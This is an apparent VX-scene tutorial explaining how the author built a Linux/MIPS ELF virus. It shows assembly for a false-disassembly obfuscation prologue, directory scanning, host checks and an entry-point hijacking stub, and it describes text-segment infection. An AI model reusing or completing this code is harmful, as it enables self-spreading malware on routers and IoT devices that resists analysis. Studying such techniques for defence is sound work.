.---\ Introduction /---.

In this short(?) paper, I will explain to you how I wrote Lin32.MIPS.Bakunin[0], my 
first virus targeting Linux/MIPS systems (such as routers, IoT stuff or video game 
consoles) in pure MIPS assembly. Obviously I didn't and I won't spread it into the 
wild. Don't do that stupid thing neither.

I used some fun tricks which I want to develop here, such as computing the Original
Entry Point of an host despite PIE, obfuscating the main part of the virus by fucking
up alignment with just few bytes, and more surprises!

Before anything, let's summarize the basic features of Bakunin:
- Infect all the ELF in the current directory, PIE or not, thanks to the Silvio
  Cesare's text infection method[1] (modify the text segment definition to make it
  able to host the virus code)
- Uses a simple but powerful Anti Reverse-Engineering technique, the false 
  disassembly[2]
- Prints "X_X" (really great payload as you can see)
- It was a great anarchist philosopher &lt;-- Not THIS Bakunin...

Now that you're hyped, we can start to dig into the Lin32.MIPS.Bakunin source code!
TW: A lot of dirty MIPS code. Take care of your eyes...

.---\ Implementing the false-disassembly technique in  /---.
     \       MIPS assembly: Coding the Prologue       /

Before anything, I want to shortly explain what is false-disassembly.

This anti-RE technique consists simply in fucking up alignment by harcoding the first
bytes (here, the first 3 bytes) of an instruction. Thus, the disassembler will 
interpret thoses "ghost" bytes as the beginning of an instruction, and complete it
with the firsts bytes of the next instruction. This will fuck up all the alignment
and can make a lot of instructions looking absurd.

For example (not from my virus):
-------------------- cut-here --------------------

                          jmp hey+2 # to jump over the ghost bytes
hey:                      hey:
   xor %rbx, %rbx             .ascii "\x48\x31"
   jmp yo            ====&gt;     xor %rbx, %rbx
                               jmp yo
---------------------------------------------------

Now, if we look at the disassembled code of those two codes we would have something
like this (radare2 ftw):

-------------------- cut-here --------------------
;-- hey:
0x00401002      4831db         xor rbx, rbx
0x00401005      eb02           jmp 0x401009
                          ||
                          \/
;-- hey:
0x00401002      48314831       xor qword [rax + 0x31], rcx
0x00401006      dbeb           fucomi st(3)
0x00401008      026631         add ah, byte [rsi + 0x31]
 ---------------------------------------------------

This is very powerful for the MIPS architecture because all the instructions are made
of the same number of bytes, which is 4, so that addresses of instructions are 
aligned to be a multiple of 4 (they end by 0x0, 0x4, 0x8 or 0xc).

So that we don't even have to put meaningful ghost bytes, we can put any byte we want
because the alignment will be fucked up anyway:

0x004000b3                    unaligned
0x004000b4      fc004003       invalid
0x004000b8      a0182523       sb t8, 0x2523(zero)
0x004000bc      bdf00003       cache 0x10, 3(t7)
0x004000c0      a0202524       sb zero, 0x2524(at)
0x004000c4      0500ff24       bltz t0, 0x3ffd58
0x004000c8      02106b00       invalid
0x004000cc      00000c03       sra at, zero, 0x10
0x004000d0      a0202524       sb zero, 0x2524(at)
0x004000d4      05000024       bltz t0, 0x400168
                 ...

Just garbage as you can see :)

However, in MIPS assembly we can't jump anywhere, we have to jump on an address
multiple of 4 because of the alignment.

That's why I divided the virus in two parts: the prologue and the body.

The prologue is constituted of a mmap2 syscall, preparing an executable area in
memory where we will copy (thanks to the .get_vx routine which follows) the body
code, which is unaligned, to be then able to jump in. In other words, we're
restoring alignment to be able to execute those instructions.

--= call the mmap2 syscall =--
  # I didn't know how to pass more than 4 arguments (the registers $a0...$a3),
  # so I made a simple program which use mmap(), I statically linked it
  # and disassembled it to see how mmap was called, that's where I've got 
  # the 3 following lines
  sw  $zero,20($sp)
  li  $v0,0
  sw  $v0,16($sp)

  li $a0, 0
  li $a1, 0x6a8 # the full virus size
  li $a2, 7    # PROT_READ|PROT_WRITE|PROT_EXEC
  li $a3, 0x0802 # MAP_ANONYMOUS | MAP_PRIVATE
  li $v0, 4210 # sys_mmap2
  syscall
------------------------------

This just stands for:

 mmap2(NULL, 0x6a8, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

Once we've got a memory area allocated, we grab the code of the virus body (after the
false disassembly bytes) to copy it in.

--= Copying the virus body =--
  bgezal $zero, get_pc  # we grab the code by directly accessing the addresses of 
                        # instructions
  add $t1, $t1, 0x6f    # 0x6f = the number of bytes to reach the body,
                        # now $t1 contains the addr of the body
  move $t2, $v0         # $t2 now contains the addr we've just mmaped
  li $t0, 0             # $t0 will be our counter

  .get_vx:
    lb $t3, 0($t1)      # we put the current grabbed byte into $t3
    sb $t3, 0($t2)      # and we write this byte at the area pointed by $t2
    addi $t0, $t0, 1
    addi $t1, $t1, 1
    addi $t2, $t2, 1
    blt $t0, 0x615, .get_vx # there is 0x615 bytes in the body

    jal $v0                 # jump to the mmaped region
    beq $zero, $zero, eof   # the body will jump here after executing the payload

  get_pc: # moving the saved eip (or pc in MIPS) in $t1
    move $t1, $ra
    jr $ra
---------------------------------

note: we use intructions such as beq or bgezal because we have to use relative jumps
in viruses (otherwise they wouldn't work in infected binaries) but classic jump
instructions (such as j or jal) are absolute...

The end of the prologue is only constituted of a call to sys_exit and a padding to
make room for 9 instructions (the eof routine will be rewritten during the infection
by the code permitting to compute the OEP despite PIE), and by .ascii "\xeb\x01\xe8",
the ghost bytes which fuck up the alignment of the body code.


.---\ Infecting the whole directory: Coding the Body /---.

Now we are in the body, we can do classic virus stuff.

To be able to infect binaries, a virus has to grab the list of the potential hosts
in the current directory.

We firstly get the name of the current dir thanks to a sys_getcwd syscall, then we
can open it through a sys_open syscall.

Once the directory is opened, we use the sys_getdents64 syscall to get a structure
containing the filenames of the file present in the dir.

We simply parse it with the following routine:

--= Parsing the dirent structure =--
li $s0, 0 # s0 will be our counter
parse_dir:
  move $s2, $sp # s2 will contain the address of the filename
  addi $s2, $s2, 0x13 # d_name

  li $t1, 0
  addi $t1, $sp, 0x12
  lb $t1, 0($t1) # t1 now contains the type of the entry (file or dir)

  bgezal $zero, infect
  li $t9, 0

  # get d_reclen (see the organization of the dirent64 structure...)
  addi $t9, $sp, 0x10
  lb $t0, 1($t9)

  # buffer position += d_reclen
  add $s0, $s0, $t0

  add $sp, $sp, $t0

  blt $s0, $s1, parse_dir # if counter &lt; nbr of entries : jmp to parse_dir
------------------------------------

Then, we open each of these files, and mmap them this way:
mmap2(NULL, len_file, PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0)

and we check if they are able to host the virus:

--= S0me checks =--
# $s5 contains the addr of the mmaped area

.check_magic:
  lw $t0, 0($s5)
  li $t1, 0x7f454c46 # check if the file is an ELF (by checking the magic bytes)
  bne $t0, $t1, end

.check_bits:
  lb $t0, 4($s5)
  bne $t0, 1, end # here, we check e_ident[EI_CLASS], to know if the ELF we're 
                  # trying to infect is 32 or 64 bit (if it's 64 bit, goto end)

.check_signature:
  lw $t0, 9($s5)  # the signature is located in e_hdr.padding, such as in 
                  # Lin64.Kropotkine[3]
  beq $t0, 0xdeadc0de, end
----------------------

Then, if we're still here, we can infect the file.
We use the silvio's infection technique:

"To insert code at the end of the text segment thus leaves us with the following
 to do so far.
    * Increase p_shoff to account for the new code in the ELF header
    * Locate the text segment program header
      * Increase p_filesz to account for the new code
      * Increase p_memsz to account for the new code
    * For each phdr who's segment is after the insertion (text segment)
      * increase p_offset to reflect the new position after insertion
    * For each shdr who's section resides after the insertion
      * Increase sh_offset to account for the new code
    * Physically insert the new code into the file - text segment p_offset
      + p_filesz (original)"[1]

The infection routine is pretty long and I widely commented it, so I won't explain
here my code point by point.

Just keep in mind that we first have to write the prologue. Because we're in the 
mmaped area, we can't grab it as we did for the body (because the prologue isn't in
the mmaped area), so I hardcoded it... (see the lines 366 to 446)

After copying the hardcoded prologue, we write the code (again hardcoded) to compute
the OEP. I used the same method as in my Lin64.Kropotkine[3], (the Elf_master's 
technique to resolve OEP despite PIE[4]).

It consists simply of doing this operation:

  get_rip() - number_of_bytes_before - new_EP + original-e_hdr.entry

Here is the MIPS code to achieve this calculus:

------------------- the code to hardcode -------------------
 0411fff5       bal get_pc
 00000000       nop
 2129fc70       addi t1, t1, -0x74 # substract the number of bytes before 
                                   # this instruction
 3401dead       ori at, zero, new_EP
 01214822       sub t1, t1, at
 2129beef       addi t1, t1, OEP
 0060e825       move sp, v1        # restore the original stack
 01200008       jr t1              # jump to the computed OEP
------------------------------------------------------------

Then, we can write the body into the host, apply changes (with sys_msync and 
sys_munmap) and finally close the file, to try to infect another one.

After infecting the whole directory, we just execute the payload ("X_X") and
finally exit!

.---\ Conclusion /---.

I hope you enjoyed this paper! I learned a lot by writing this virus, I've never
written anything in MIPS assembly before...

I hope you learned as much as I learned by working on this virus during two months.
